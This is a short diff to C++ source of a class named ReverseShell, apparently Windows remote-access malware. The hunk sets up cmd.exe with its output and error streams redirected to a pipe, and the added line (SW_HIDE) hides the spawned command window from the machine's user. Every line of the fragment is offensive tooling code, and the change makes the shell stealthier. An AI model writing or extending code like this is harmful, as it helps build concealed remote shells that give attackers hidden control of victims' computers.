@@ -14,6 +14,7 @@ void ReverseShell::initializeCMDProcess() {
     si.hStdOutput = hWrite;
     si.hStdError = hWrite;
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
 
     wchar_t cmd[] = L"cmd.exe";
     CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
